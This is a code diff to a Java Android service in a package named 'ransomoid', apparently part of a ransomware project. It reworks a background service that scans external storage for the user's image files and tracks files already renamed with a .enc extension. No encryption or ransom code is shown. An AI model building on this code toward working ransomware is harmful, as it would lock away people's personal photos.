@@ -1,26 +1,31 @@
 package falezza.fabio.ransomoid.services;
 
+import android.app.IntentService;
 import android.app.Service;
 import android.content.Intent;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.support.annotation.Nullable;
+import android.widget.Toast;
 
 import java.io.File;
 import java.util.ArrayList;
 
 import falezza.fabio.ransomoid.utils.FileProcessor;
 
-public class ParentService extends Service {
+public class ParentService extends IntentService {
     private static final String[] imgExtensions =
             {".jpg", ".jpeg", ".png", ".JPG", ".PNG", ".JPEG"};
 
-    private static final String[] excludeExtensions = {"Android/data", ".thumbnails"};
+    private static final String[] excludeExtensions = {"Android/data", ".thumbnails", ".enc"};
 
     ArrayList<File> imgList;
 
-
-    public ParentService() {
+    public ParentService(String name) {
+        super(name);
     }
+
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -29,14 +34,30 @@ public class ParentService extends Service {
     }
 
     @Override
-    public void onCreate() {
-        super.onCreate();
+    protected void onHandleIntent(@Nullable Intent intent) {
         FileProcessor fileProcessor = FileProcessor.getInstance();
         this.imgList = fileProcessor.getFiles(Environment.getExternalStorageDirectory(),
                 imgExtensions, excludeExtensions);
     }
 
+    protected void showMessage(final String message) {
+        Handler mHandler = new Handler(getMainLooper());
+        mHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+
     protected boolean isEncrypted(File file) {
         return file.getPath().contains(".enc");
     }
+
+    protected ArrayList<File> getEncryptedFiles() {
+        return FileProcessor.getInstance().getFiles(Environment.getExternalStorageDirectory(),
+                new String[]{".enc"}, excludeExtensions);
+    }
+
+
 }
